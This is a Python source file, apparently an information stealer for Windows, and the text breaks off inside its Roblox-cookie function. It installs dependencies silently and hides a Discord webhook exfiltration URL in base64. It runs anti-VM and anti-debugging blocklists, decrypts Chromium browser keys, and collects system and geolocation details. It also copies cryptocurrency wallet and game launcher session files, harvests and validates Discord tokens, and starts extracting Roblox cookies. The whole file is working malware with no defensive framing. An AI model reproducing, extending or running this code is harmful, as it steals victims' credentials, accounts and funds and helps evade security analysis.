import subprocess
import sys

def _0xInstallDependencies():
    packages = ["requests", "psutil", "pywin32", "pycryptodome", "browser-cookie3", "opencv-python", "numpy", "pillow", "pyinstaller", "pefile"]
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade"] + packages,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,)

_0xInstallDependencies()

import os, sys, subprocess, socket, platform, zipfile, shutil, ctypes, stat
import datetime, json, requests, base64, time, re, random, getpass, uuid

_config_encoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzNjUxMjAyMDIxODc3NzY2MC9za2hKSFRpRFRLa3ExTG9peGJXblVIaktWR05QWGZmR29DRG5ZZUh0dG5LdUh5XzBnY0tmaWVUd3NsYWhSMXFoOHFkS3xodHRwczovL2kuaW1ndXIuY29tL0c4UVIwZjcucG5n"

def _0xDecodeConfig(_enc):
    _d = base64.b64decode(_enc).decode('utf-8')
    _p = _d.split('|')
    return (_p[0], _p[1]) if len(_p) == 2 else (None, None)

_wh_url, _icon_url = _0xDecodeConfig(_config_encoded)

_http = requests.Session()
_http.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive'
})

_user_pc = os.getlogin()
_zip_dir = f"Buildware_{_user_pc}"
os.makedirs(_zip_dir, exist_ok=True)

_APPDATA = os.getenv('APPDATA', os.path.expanduser('~\\AppData\\Roaming'))
_LOCAL = os.getenv('LOCALAPPDATA', os.path.expanduser('~\\AppData\\Local'))
_USERPROFILE = os.getenv('USERPROFILE')

def _0xAntiVM():
    _bl_user = {'WDAGUtilityAccount','Abby','hmarc','patex','RDhJ0CNFevzX','kEecfMwgj','Frank','8Nl0ColNQ5bq','Lisa','John','george','Bruno','PxmdUOpVyx','8VizSM','w0fjuOVmCcP5A','lmVwjj9b','PqONjHVwexsS','3u2v9m8','Julia','HEUeRzl','fred','server','BvJChRPnsxn','Harry Johnson','SqgFOf3G','Lucas','mike','PateX','h7dk1xPr','Louise','User01','test','RGzcBUyrznReg','stephpie'}
    _bl_user_l = {u.lower() for u in _bl_user}
    _bl_host = {'0CC47AC83802','BEE7370C-8C0C-4','DESKTOP-ET51AJO','965543','DESKTOP-NAKFFMT','WIN-5E07COS9ALR','B30F0242-1C6A-4','DESKTOP-VRSQLAG','Q9IATRKPRH','XC64ZB','DESKTOP-D019GDM','DESKTOP-WI8CLET','SERVER1','LISA-PC','JOHN-PC','DESKTOP-B0T93D6','DESKTOP-1PYKP29','DESKTOP-1Y2433R','WILEYPC','WORK','6C4E733F-C2D9-4','RALPHS-PC','DESKTOP-WG3MYJS','DESKTOP-7XC6GEZ','DESKTOP-5OV9S0O','QarZhrdBpj','ORELEEPC','ARCHIBALDPC','JULIA-PC','d1bnJkfVlH','NETTYPC','DESKTOP-BUGIO','DESKTOP-CBGPFEE','SERVER-PC','TIQIYLA9TW5M','DESKTOP-KALVINO','COMPNAME_4047','DESKTOP-19OLLTD','DESKTOP-DE369SE','EA8C2E2A-D017-4','AIDANPC','LUCAS-PC','MARCI-PC','ACEPC','MIKE-PC','DESKTOP-IAPKN1P','DESKTOP-NTU7VUO','LOUISE-PC','T00917','test42','test'}
    _bl_host_l = {h.lower() for h in _bl_host}
    _bl_hwid = {'7AB5C494-39F5-4941-9163-47F54D6D5016','03DE0294-0480-05DE-1A06-350700080009','11111111-2222-3333-4444-555555555555','6F3CA5EC-BEC9-4A4D-8274-11168F640058','ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548','4C4C4544-0050-3710-8058-CAC04F59344A','00000000-0000-0000-0000-AC1F6BD04972','00000000-0000-0000-0000-000000000000','5BD24D56-789F-8468-7CDC-CAA7222CC121','49434D53-0200-9065-2500-65902500E439','49434D53-0200-9036-2500-36902500F022','777D84B3-88D1-451C-93E4-D235177420A7','B1112042-52E8-E25B-3655-6A4F54155DBF','00000000-0000-0000-0000-AC1F6BD048FE','EB16924B-FB6D-4FA1-8666-17B91F62FB37','A15A930C-8251-9645-AF63-E45AD728C20C','67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3','C7D23342-A5D4-68A1-59AC-CF40F735B363','63203342-0EB0-AA1A-4DF5-3FB37DBB0670','44B94D56-65AB-DC02-86A0-98143A7423BF','6608003F-ECE4-494E-B07E-1C4615D1D93C','D9142042-8F51-5EFF-D5F8-EE9AE3D1602A','8B4E8278-525C-7343-B825-280AEBCD3BCB','4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27','79AF5279-16CF-4094-9758-F88A616D81B4','FF577B79-782E-0A4D-8568-B35A9B7EB76B','08C1E400-3C56-11EA-8000-3CECEF43FEDE','6ECEAF72-3548-476C-BD8D-73134A9182C8','63FA3342-31C7-4E8E-8089-DAFF6CE5E967','365B4000-3B25-11EA-8000-3CECEF44010C','D8C30328-1B06-4611-8E3C-E433F4F9794E','00000000-0000-0000-0000-50E5493391EF','4CB82042-BA8F-1748-C941-363C391CA7F3','B6464A2B-92C7-4B95-A2D0-E5410081B812','BB233342-2E01-718F-D4A1-E7F69D026428','9921DE3A-5C1A-DF11-9078-563412000026','CC5B3F62-2A04-4D2E-A46C-AA41B7050712','00000000-0000-0000-0000-AC1F6BD04986','C249957A-AA08-4B21-933F-9271BEC63C85','BE784D56-81F5-2C8D-9D4B-5AB56F05D86E','ACA69200-3C4C-11EA-8000-3CECEF4401AA','3F284CA4-8BDF-489B-A273-41B44D668F6D','BB64E044-87BA-C847-BC0A-C797D1A16A50','2E6FB594-9D55-4424-8E74-CE25A25E36B0','42A82042-3F13-512F-5E3D-6BF4FFFD8518','38AB3342-66B0-7175-0B23-F390B3728B78','48941AE9-D52F-11DF-BBDA-503734826431','032E02B4-0499-05C3-0806-3C0700080009','DD9C3342-FB80-9A31-EB04-5794E5AE2B4C','E08DE9AA-C704-4261-B32D-57B2A3993518','88DC3342-12E6-7D62-B0AE-C80E578E7B07','5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E','96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE','0934E336-72E4-4E6A-B3E5-383BD8E938C3','12EE3342-87A2-32DE-A390-4C2DA4D512E9','38813342-D7D0-DFC8-C56F-7FC9DFE5C972','8DA62042-8B59-B4E3-D232-38B29A10964A','3A9F3342-D1F2-DF37-68AE-C10F60BFB462','F5744000-3C78-11EA-8000-3CECEF43FEFE','FA8C2042-205D-13B0-FCB5-C5CC55577A35','C6B32042-4EC3-6FDF-C725-6F63914DA7C7','FCE23342-91F1-EAFC-BA97-5AAE4509E173','CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F','050C3342-FADD-AEDF-EF24-C6454E1A73C9','4DC32042-E601-F329-21C1-03F27564FD6C','DEAEB8CE-A573-9F48-BD40-62ED6C223F20','05790C00-3B21-11EA-8000-3CECEF4400D0','5EBD2E42-1DB8-78A6-0EC3-031B661D5C57','9C6D1742-046D-BC94-ED09-C36F70CC9A91','A9C83342-4800-0578-1EE8-BA26D2A678D2','D7382042-00A0-A6F0-1E51-FD1BBF06CD71','1D4D3342-D6C4-710C-98A3-9CC6571234D5','CE352E42-9339-8484-293A-BD50CDC639A5','60C83342-0A97-928D-7316-5F1080A78E72','02AD9898-FA37-11EB-AC55-1D0C0A67EA8A','DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F','FED63342-E0D6-C669-D53F-253D696D74DA','2DD1B176-C043-49A4-830F-C623FFB88F3C','4729AEB0-FC07-11E3-9673-CE39E79C8A00','84FE3342-6C67-5FC6-5639-9B3CA3D775A1','DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D','CEFC836C-8CB1-45A6-ADD7-209085EE2A57','A7721742-BE24-8A1C-B859-D7F8251A83D3','3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E','D2DC3342-396C-6737-A8F6-0C6673C1DE08','EADD1742-4807-00A0-F92E-CCD933E9D8C1','AF1B2042-4B90-0000-A4E4-632A1C8C7EB1','FE455D1A-BE27-4BA4-96C8-967A6D3A9661','921E2042-70D3-F9F1-8CBD-B398A21F89C6'}
    _bl_proc = {'cheatengine','cheat engine','x32dbg','x64dbg','ollydbg','windbg','ida','ida64','ghidra','radare2','radare','dbg','immunitydbg','dnspy','softice','edb','debugger','lldb','gdb','hex-rays','disassembler','tracer','debugview','procdump','frida','api monitor','process hacker','procexp','process explorer'}
    import psutil as _ps
    if sys.gettrace() or (ctypes.windll.kernel32.IsDebuggerPresent() if hasattr(ctypes.windll.kernel32, 'IsDebuggerPresent') else False):
        sys.exit(1)
    try:
        _cu = os.getlogin()
        if _cu in _bl_user or _cu.lower() in _bl_user_l: sys.exit(1)
    except: pass
    try:
        _ch = socket.gethostname()
        if _ch in _bl_host or _ch.lower() in _bl_host_l: sys.exit(1)
    except: pass
    try:
        for _pr in _ps.process_iter(['name']):
            try:
                if any(_db in _pr.info['name'].lower() for _db in _bl_proc): sys.exit(1)
            except: continue
    except: pass
    try:
        _uo = subprocess.check_output('wmic csproduct get uuid', shell=True, stderr=subprocess.DEVNULL, timeout=3).decode('utf-8', errors='ignore')
        _ul = _uo.split('\n')
        if len(_ul) > 1 and _ul[1].strip() in _bl_hwid: sys.exit(1)
    except: pass

_0xAntiVM()

if os.name != 'nt': sys.exit(1)

def _0xCheckConn():
    for _u in ["https://www.google.com","https://discord.com","https://api.gofile.io"]:
        try:
            _http.get(_u, timeout=5)
            return True
        except: continue
    return False

if not _0xCheckConn(): sys.exit(1)

def _0xEnsurePkg():
    _pkgs = {"opencv-python":"cv2","screeninfo":"screeninfo","pillow":"PIL","pywin32":"win32api","numpy":"numpy","requests":"requests","pycryptodome":"Crypto","browser-cookie3":"browser_cookie3","psutil":"psutil"}
    import importlib
    for _pn, _mn in _pkgs.items():
        try: importlib.import_module(_mn)
        except:
            try: subprocess.run([sys.executable,"-m","pip","install","--upgrade",_pn], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=90)
            except: pass
    try:
        importlib.import_module("Cryptodome.Util.number")
    except:
        try:
            subprocess.run([sys.executable,"-m","pip","install","--upgrade","--force-reinstall","--no-cache-dir","pycryptodome>=3.19.1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
        except: pass

_0xEnsurePkg()

import sqlite3, psutil
import win32crypt
from Crypto.Cipher import AES

_BROWSERS = {
    "Chrome": os.path.join(_LOCAL,"Google","Chrome","User Data"),
    "Chrome SxS": os.path.join(_LOCAL,"Google","Chrome SxS","User Data"),
    "Chrome Beta": os.path.join(_LOCAL,"Google","Chrome Beta","User Data"),
    "Chrome Dev": os.path.join(_LOCAL,"Google","Chrome Dev","User Data"),
    "Chrome Canary": os.path.join(_LOCAL,"Google","Chrome Canary","User Data"),
    "Edge": os.path.join(_LOCAL,"Microsoft","Edge","User Data"),
    "Edge Beta": os.path.join(_LOCAL,"Microsoft","Edge Beta","User Data"),
    "Edge Dev": os.path.join(_LOCAL,"Microsoft","Edge Dev","User Data"),
    "Edge SxS": os.path.join(_LOCAL,"Microsoft","Edge SxS","User Data"),
    "Brave": os.path.join(_LOCAL,"BraveSoftware","Brave-Browser","User Data"),
    "Brave Beta": os.path.join(_LOCAL,"BraveSoftware","Brave-Browser-Beta","User Data"),
    "Brave Dev": os.path.join(_LOCAL,"BraveSoftware","Brave-Browser-Dev","User Data"),
    "Brave Nightly": os.path.join(_LOCAL,"BraveSoftware","Brave-Browser-Nightly","User Data"),
    "Opera": os.path.join(_APPDATA,"Opera Software","Opera Stable"),
    "Opera GX": os.path.join(_APPDATA,"Opera Software","Opera GX Stable"),
    "Opera Beta": os.path.join(_APPDATA,"Opera Software","Opera Beta"),
    "Opera Developer": os.path.join(_APPDATA,"Opera Software","Opera Developer"),
    "Opera Next": os.path.join(_APPDATA,"Opera Software","Opera Next"),
    "Opera Crypto": os.path.join(_APPDATA,"Opera Software","Opera Crypto"),
    "Vivaldi": os.path.join(_LOCAL,"Vivaldi","User Data"),
    "Chromium": os.path.join(_LOCAL,"Chromium","User Data"),
    "Yandex": os.path.join(_LOCAL,"Yandex","YandexBrowser","User Data"),
    "Iridium": os.path.join(_LOCAL,"Iridium","User Data"),
    "Amigo": os.path.join(_LOCAL,"Amigo","User Data"),
    "Torch": os.path.join(_LOCAL,"Torch","User Data"),
    "Kometa": os.path.join(_LOCAL,"Kometa","User Data"),
    "Orbitium": os.path.join(_LOCAL,"Orbitium","User Data"),
    "CentBrowser": os.path.join(_LOCAL,"CentBrowser","User Data"),
    "7Star": os.path.join(_LOCAL,"7Star","7Star","User Data"),
    "Sputnik": os.path.join(_LOCAL,"Sputnik","Sputnik","User Data"),
    "Uran": os.path.join(_LOCAL,"uCozMedia","Uran","User Data"),
    "Slimjet": os.path.join(_LOCAL,"Slimjet","User Data"),
    "Epic Privacy Browser": os.path.join(_LOCAL,"Epic Privacy Browser","User Data"),
    "CocCoc": os.path.join(_LOCAL,"CocCoc","Browser","User Data"),
    "Avast Secure Browser": os.path.join(_LOCAL,"AVAST Software","Browser","User Data"),
    "AVG Browser": os.path.join(_LOCAL,"AVG","Browser","User Data"),
    "CCleaner Browser": os.path.join(_LOCAL,"CCleaner Browser","User Data"),
    "UR Browser": os.path.join(_LOCAL,"UR Browser","User Data"),
    "Comodo Dragon": os.path.join(_LOCAL,"Comodo","Dragon","User Data"),
    "CryptoTab": os.path.join(_LOCAL,"CryptoTab Browser","User Data"),
    "Arc": os.path.join(_LOCAL,"Arc","User Data"),
    "Wavebox": os.path.join(_LOCAL,"Wavebox","User Data"),
    "360Chrome": os.path.join(_LOCAL,"360Chrome","Chrome","User Data"),
    "Maxthon": os.path.join(_LOCAL,"Maxthon","User Data"),
    "ungoogled-chromium": os.path.join(_LOCAL,"ungoogled-chromium","User Data"),
    "Thorium": os.path.join(_LOCAL,"Thorium","User Data"),
    "Superbird": os.path.join(_LOCAL,"Superbird","User Data"),
    "Chedot": os.path.join(_LOCAL,"Chedot","User Data"),
    "Liebao": os.path.join(_LOCAL,"liebao","User Data"),
    "QIP Surf": os.path.join(_LOCAL,"QIP Surf","User Data"),
    "Coowon": os.path.join(_LOCAL,"Coowon","Coowon","User Data"),
    "Ungoogled Chromium": os.path.join(_LOCAL,"Ungoogled-Chromium","User Data"),
}

def _0xGetKey(_bp):
    try:
        with open(os.path.join(_bp,"Local State"),"r",encoding="utf-8") as _f:
            _ls = json.load(_f)
        _ek = base64.b64decode(_ls["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(_ek, None, None, None, 0)[1]
    except: return None

def _0xDecrypt(_val, _key):
    try:
        _iv = _val[3:15]; _pay = _val[15:-16]; _tag = _val[-16:]
        _c = AES.new(_key, AES.MODE_GCM, _iv)
        return _c.decrypt_and_verify(_pay, _tag).decode('utf-8')
    except:
        try: return win32crypt.CryptUnprotectData(_val, None, None, None, 0)[1].decode('utf-8')
        except: return ""

def _0xProfiles(_bp):
    if not os.path.exists(_bp): return []
    return ["Default"] + [d for d in os.listdir(_bp) if os.path.isdir(os.path.join(_bp,d)) and d.startswith("Profile ")]


def _0xSysInfo():
    import psutil as _ps, uuid as _uid
    def _sz(_b): return f"{_b/(1024**3):.2f} Go"
    def _cmd(_c):
        try: return subprocess.check_output(_c, shell=True, stderr=subprocess.DEVNULL, timeout=3).decode('utf-8',errors='ignore').strip()
        except: return "None"
    def _wmi(_q):
        _r = _cmd(_q)
        if _r and _r != "None" and "\n" in _r:
            _l = _r.split("\n"); return _l[-1].strip() if len(_l) > 1 else "None"
        return _r if _r else "None"
    def _reg(_p, _k):
        _r = _cmd(f'reg query "{_p}" /v {_k} 2>nul')
        if _r != "None" and "ERROR" not in _r:
            for _ln in _r.split('\n'):
                if _k in _ln:
                    _pts = _ln.split()
                    if len(_pts) >= 3: return _pts[-1]
        return "None"
    _hn = platform.node()
    _un = os.environ.get('USERNAME','Unknown')
    try:
        _dn_f = ctypes.windll.secur32.GetUserNameExW
        _sz_p = ctypes.pointer(ctypes.c_ulong(0))
        _dn_f(3, None, _sz_p)
        _nb = ctypes.create_unicode_buffer(_sz_p.contents.value)
        _dn_f(3, _nb, _sz_p)
        _dn = _nb.value
    except: _dn = _un
    _cpu = _wmi("wmic cpu get name /value").replace("Name=","") + f", {_ps.cpu_count(logical=False)} Core"
    _gpu = _wmi("wmic path win32_VideoController get name /value").replace("Name=","")
    _ram = _sz(_ps.virtual_memory().total)
    _disks = []
    for _pt in _ps.disk_partitions():
        if 'cdrom' not in _pt.opts.lower() and _pt.fstype:
            try:
                _u = _ps.disk_usage(_pt.mountpoint)
                _disks.append(f"{_pt.mountpoint} Free:{_sz(_u.free)} Total:{_sz(_u.total)} Use:{_u.percent}%")
            except: pass
    _mac = ':'.join(['{:02x}'.format((_uid.getnode() >> e) & 0xff) for e in range(0,12,2)][::-1])
    _mid = _wmi("wmic csproduct get uuid /value").replace("UUID=","")
    _mguid = _reg("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography","MachineGuid")
    try: _lip = socket.gethostbyname(socket.gethostname())
    except: _lip = "None"
    try: _pip = _http.get('https://api.ipify.org', timeout=5).text
    except: _pip = "None"
    _ipd = {}
    if _pip != "None":
        try:
            _r = _http.get(f'http://ip-api.com/json/{_pip}', timeout=5)
            if _r.status_code == 200: _ipd = _r.json()
        except: pass
    _txt = f"""[+] User Pc:
    - Hostname    : {_hn}
    - Username    : {_un}
    - DisplayName : {_dn}
[+] Peripheral:
    - CPU : {_cpu}
    - GPU : {_gpu}
    - RAM : {_ram}
[+] Disk:
    {chr(10).join('    - ' + d for d in _disks) if _disks else '    - None'}
[+] Serial:
    - MAC          : {_mac}
    - Machine Id   : {_mid}
    - Machine Guid : {_mguid}
[+] Ip:
    - Public : {_pip}
    - Local  : {_lip}
[+] Ip Info:
    - ISP      : {_ipd.get('isp','None')}
    - Country  : {_ipd.get('country','None')} ({_ipd.get('countryCode','')})
    - Region   : {_ipd.get('regionName','None')}
    - City     : {_ipd.get('city','None')}
    - Timezone : {_ipd.get('timezone','None')}
"""
    with open(os.path.join(_zip_dir,"SystemInformation.txt"),'w',encoding='utf-8') as _f:
        _f.write(_txt)


def _0xWallets():
    _wlist = [
        ("Zcash", os.path.join(_APPDATA,"Zcash")),
        ("Armory", os.path.join(_APPDATA,"Armory")),
        ("Bytecoin", os.path.join(_APPDATA,"bytecoin")),
        ("Guarda", os.path.join(_APPDATA,"Guarda","Local Storage","leveldb")),
        ("Atomic", os.path.join(_APPDATA,"atomic","Local Storage","leveldb")),
        ("Exodus", os.path.join(_APPDATA,"Exodus","exodus.wallet")),
        ("Binance", os.path.join(_APPDATA,"Binance","Local Storage","leveldb")),
        ("Jaxx", os.path.join(_APPDATA,"com.liberty.jaxx","IndexedDB","file__0.indexeddb.leveldb")),
        ("Electrum", os.path.join(_APPDATA,"Electrum","wallets")),
        ("Coinomi", os.path.join(_APPDATA,"Coinomi","Coinomi","wallets")),
        ("TrustWallet", os.path.join(_APPDATA,"Trust Wallet")),
        ("AtomicDEX", os.path.join(_APPDATA,"AtomicDEX")),
        ("Wasabi", os.path.join(_APPDATA,"WalletWasabi","Wallets")),
        ("Ledger", os.path.join(_APPDATA,"Ledger Live")),
        ("Trezor", os.path.join(_APPDATA,"Trezor","suite")),
        ("Coinbase", os.path.join(_APPDATA,"Coinbase","Wallet")),
    ]
    for _name, _path in _wlist:
        if not os.path.exists(_path): continue
        try:
            _dst = os.path.join(_zip_dir,"Sessions","Wallets",_name)
            os.makedirs(_dst, exist_ok=True)
            if os.path.isdir(_path):
                for _rt, _, _fs in os.walk(_path):
                    for _fl in _fs:
                        _src = os.path.join(_rt, _fl)
                        _rel = os.path.relpath(_src, _path)
                        _dp = os.path.join(_dst, _rel)
                        try:
                            os.makedirs(os.path.dirname(_dp), exist_ok=True)
                            shutil.copy2(_src, _dp)
                        except: pass
            else:
                shutil.copy2(_path, os.path.join(_dst, os.path.basename(_path)))
        except: pass


def _0xGames():
    _x86 = os.getenv('ProgramFiles(x86)','C:\\Program Files (x86)')
    _glist = [
        ("Steam", os.path.join(_x86,"Steam","config")),
        ("RiotGames", os.path.join(_LOCAL,"Riot Games","Riot Client","Data")),
        ("EpicGames", os.path.join(_LOCAL,"EpicGamesLauncher")),
        ("Rockstar", os.path.join(_LOCAL,"Rockstar Games")),
    ]
    for _name, _path in _glist:
        if not os.path.exists(_path): continue
        try:
            _dst = os.path.join(_zip_dir,"Sessions","Games",_name)
            os.makedirs(_dst, exist_ok=True)
            if os.path.isdir(_path):
                for _rt, _, _fs in os.walk(_path):
                    for _fl in _fs:
                        _src = os.path.join(_rt, _fl)
                        _rel = os.path.relpath(_src, _path)
                        _dp = os.path.join(_dst, _rel)
                        try:
                            os.makedirs(os.path.dirname(_dp), exist_ok=True)
                            shutil.copy2(_src, _dp)
                        except: pass
        except: pass


def _0xDiscordTokens():
    _R = os.getenv("APPDATA", "")
    _L = os.getenv("LOCALAPPDATA", "")
    _roots = [
        ("Discord", os.path.join(_R, "discord")),
        ("Discord Canary", os.path.join(_R, "discordcanary")),
        ("Discord PTB", os.path.join(_R, "discordptb")),
        ("Lightcord", os.path.join(_R, "Lightcord")),
        ("Opera", os.path.join(_R, "Opera Software", "Opera Stable")),
        ("Opera GX", os.path.join(_R, "Opera Software", "Opera GX Stable")),
        ("Opera Beta", os.path.join(_R, "Opera Software", "Opera Beta")),
        ("Opera Developer", os.path.join(_R, "Opera Software", "Opera Developer")),
        ("Opera Next", os.path.join(_R, "Opera Software", "Opera Next")),
        ("Opera Crypto", os.path.join(_R, "Opera Software", "Opera Crypto")),
        ("Chrome", os.path.join(_L, "Google", "Chrome", "User Data")),
        ("Chrome SxS", os.path.join(_L, "Google", "Chrome SxS", "User Data")),
        ("Chrome Beta", os.path.join(_L, "Google", "Chrome Beta", "User Data")),
        ("Chrome Dev", os.path.join(_L, "Google", "Chrome Dev", "User Data")),
        ("Edge", os.path.join(_L, "Microsoft", "Edge", "User Data")),
        ("Edge Beta", os.path.join(_L, "Microsoft", "Edge Beta", "User Data")),
        ("Edge Dev", os.path.join(_L, "Microsoft", "Edge Dev", "User Data")),
        ("Edge SxS", os.path.join(_L, "Microsoft", "Edge SxS", "User Data")),
        ("Brave", os.path.join(_L, "BraveSoftware", "Brave-Browser", "User Data")),
        ("Brave Beta", os.path.join(_L, "BraveSoftware", "Brave-Browser-Beta", "User Data")),
        ("Brave Dev", os.path.join(_L, "BraveSoftware", "Brave-Browser-Dev", "User Data")),
        ("Brave Nightly", os.path.join(_L, "BraveSoftware", "Brave-Browser-Nightly", "User Data")),
        ("Vivaldi", os.path.join(_L, "Vivaldi", "User Data")),
        ("Chromium", os.path.join(_L, "Chromium", "User Data")),
        ("Yandex", os.path.join(_L, "Yandex", "YandexBrowser", "User Data")),
        ("Iridium", os.path.join(_L, "Iridium", "User Data")),
        ("Torch", os.path.join(_L, "Torch", "User Data")),
        ("Kometa", os.path.join(_L, "Kometa", "User Data")),
        ("Orbitium", os.path.join(_L, "Orbitium", "User Data")),
        ("CentBrowser", os.path.join(_L, "CentBrowser", "User Data")),
        ("7Star", os.path.join(_L, "7Star", "7Star", "User Data")),
        ("Sputnik", os.path.join(_L, "Sputnik", "Sputnik", "User Data")),
        ("Uran", os.path.join(_L, "uCozMedia", "Uran", "User Data")),
        ("Amigo", os.path.join(_L, "Amigo", "User Data")),
        ("Slimjet", os.path.join(_L, "Slimjet", "User Data")),
        ("Epic Privacy Browser", os.path.join(_L, "Epic Privacy Browser", "User Data")),
        ("CocCoc", os.path.join(_L, "CocCoc", "Browser", "User Data")),
        ("Avast Secure Browser", os.path.join(_L, "AVAST Software", "Browser", "User Data")),
        ("AVG Browser", os.path.join(_L, "AVG", "Browser", "User Data")),
        ("CCleaner Browser", os.path.join(_L, "CCleaner Browser", "User Data")),
        ("UR Browser", os.path.join(_L, "UR Browser", "User Data")),
        ("Comodo Dragon", os.path.join(_L, "Comodo", "Dragon", "User Data")),
        ("CryptoTab", os.path.join(_L, "CryptoTab Browser", "User Data")),
        ("Arc", os.path.join(_L, "Arc", "User Data")),
        ("Wavebox", os.path.join(_L, "Wavebox", "User Data")),
        ("360Chrome", os.path.join(_L, "360Chrome", "Chrome", "User Data")),
        ("Maxthon", os.path.join(_L, "Maxthon", "User Data")),
        ("ungoogled-chromium", os.path.join(_L, "ungoogled-chromium", "User Data")),
        ("Thorium", os.path.join(_L, "Thorium", "User Data")),
        ("Superbird", os.path.join(_L, "Superbird", "User Data")),
        ("Chedot", os.path.join(_L, "Chedot", "User Data")),
        ("Liebao", os.path.join(_L, "liebao", "User Data")),
        ("QIP Surf", os.path.join(_L, "QIP Surf", "User Data")),
        ("Coowon", os.path.join(_L, "Coowon", "Coowon", "User Data")),
        ("Ungoogled Chromium", os.path.join(_L, "Ungoogled-Chromium", "User Data")),
    ]
    def _dc_profiles(_root):
        _out = []
        if not os.path.isdir(_root):
            return _out
        if os.path.isdir(os.path.join(_root, "Local Storage", "leveldb")):
            return [_root]
        _def = os.path.join(_root, "Default")
        if os.path.isdir(os.path.join(_def, "Local Storage", "leveldb")):
            _out.append(_def)
        try:
            for _d in sorted(os.listdir(_root)):
                if _d.startswith("Profile ") and os.path.isdir(os.path.join(_root, _d, "Local Storage", "leveldb")):
                    _out.append(os.path.join(_root, _d))
        except Exception:
            pass
        return _out
    def _getTokens(_p):
        _ldb = os.path.join(_p, "Local Storage", "leveldb")
        _tks = []
        if not os.path.isdir(_ldb):
            return _tks
        try:
            for _fl in os.listdir(_ldb):
                if not _fl.endswith((".ldb", ".log")):
                    continue
                try:
                    with open(os.path.join(_ldb, _fl), "r", errors="ignore") as _f:
                        for _ln in _f:
                            for _v in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", _ln.strip()):
                                _tks.append(_v)
                except Exception:
                    continue
        except Exception:
            pass
        return _tks
    def _decTk(_enc, _key):
        _d = base64.b64decode(_enc.split("dQw4w9WgXcQ:")[1])
        _iv = _d[3:15]; _pay = _d[15:-16]
        return AES.new(_key, AES.MODE_GCM, _iv).decrypt(_pay).decode()
    def _validTk(_tk):
        try:
            return _http.get("https://discord.com/api/v9/users/@me", headers={"Authorization": _tk}, timeout=5).status_code == 200
        except Exception:
            return False
    def _userInfo(_tk):
        try:
            _r = _http.get("https://discord.com/api/v9/users/@me", headers={"Authorization": _tk}, timeout=5)
            return _r.json() if _r.status_code == 200 else None
        except Exception:
            return None
    _checked = []
    _data = {}
    for _nm, _root in _roots:
        if not os.path.isdir(_root):
            continue
        try:
            _key = _0xGetKey(_root)
        except Exception:
            _key = None
        if not _key:
            continue
        for _prof in _dc_profiles(_root):
            _bn = os.path.basename(_prof)
            if _prof == _root or _bn == "Default":
                _tag = _nm
            else:
                _tag = _nm + " / " + _bn
            for _tk in _getTokens(_prof):
                try:
                    _dec = _decTk(_tk, _key)
                    if _dec not in _checked and _validTk(_dec):
                        _ui = _userInfo(_dec)
                        if _ui:
                            _checked.append(_dec)
                            _data[_tag] = {"token": _dec, "info": _ui}
                except Exception:
                    continue
    _fp = os.path.join(_zip_dir, "DiscordTokens.txt")
    with open(_fp, "w", encoding="utf-8") as _f:
        _f.write(f"[+] Total: {len(_checked)} valid tokens\n\n")
        for _nm, _d in _data.items():
            _i = _d["info"]
            _nt = {0: "No", 1: "Classic", 2: "Boost", 3: "Basic"}.get(_i.get("premium_type", 0), "No")
            _f.write(f"[+] {_nm}\n    Token    : {_d['token']}\n    Username : {_i.get('username','N/A')}\n    Email    : {_i.get('email','N/A')}\n    Phone    : {_i.get('phone','N/A')}\n    Nitro    : {_nt}\n\n")


def _0xRobloxCookies():
    import sys as _rbx_sys
    import subprocess as _rbx_sp
    _fp = os.path.join(_zip_dir, "RobloxCookies.txt")
    _lines = ["[+] Roblox Cookies", "=" * 44, ""]
    def _rbx_save():
        try:
            with open(_fp, "w", encoding="utf-8") as _wf:
                _wf.write("\n".join(_lines) + "\n")
        except Exception:
            pass
    try:
        try:
            import Cryptodome.Util.number
        except Exception:
            try:
                _rbx_sp.run([_rbx_sys.executable, "-m", "pip", "install", "--upgrade", "--force-reinstall", "--no-cache-dir", "pycryptodome>=3.19.1"], stdout=_rbx_sp.DEVNULL, stderr=_rbx_sp.DEVNULL, timeout=180)
            except Exception:
                pass
        try:
            import browser_cookie3 as _bc3
        except Exception:
            try:
                _rbx_sp.run([_rbx_sys.executable, "-m", "pip", "install", "--upgrade", "--force-reinstall", "--no-cache-dir", "pycryptodome>=3.19.1", "browser-cookie3"], stdout=_rbx_sp.DEVNULL, stderr=_rbx_sp.DEVNULL, timeout=180)
            except Exception:
                pass
            try:
                import importlib as _rbx_il
                _rbx_il.invalidate_caches()
            except Exception:
                pass
            import browser_cookie3 as _bc3
        _RO_NAMES = (".ROBLOSECURITY", "_ROBLOSECURITY", "ROBLOSECURITY")
        def _load_jar(_fn, _dom):
            try:
                _o = _fn(domain_name=_dom)
            except Exception:
                return None
            try:
                if hasattr(_o, "load") and callable(_o.load):
                    return _o.load()
            except Exception:
                return None
            return _o
        def _pick_cookie(_jar):
            if not _jar:
                return None
            for _c in _jar:
                try:
                    _n = (_c.name or "").strip()
                    _d = ((_c.domain or "") + "").lower()
                except Exception:
                    continue
                if _n in _RO_NAMES or "ROBLOSECURITY" in _n:
                    if (not _d) or ("roblox" in _d):
                        _v = (_c.value or "").strip()
                        if _v:
                            return _v
            return None
        def _roblox_cookie_from_browser(_fn):
            for _dom in ("roblox.com", ""):
                _jar = _load_jar(_fn, _dom)
                _v = _pick_cookie(_jar)
                if _v:
                    return _v
            return None
        def _rbx_api(_ck):
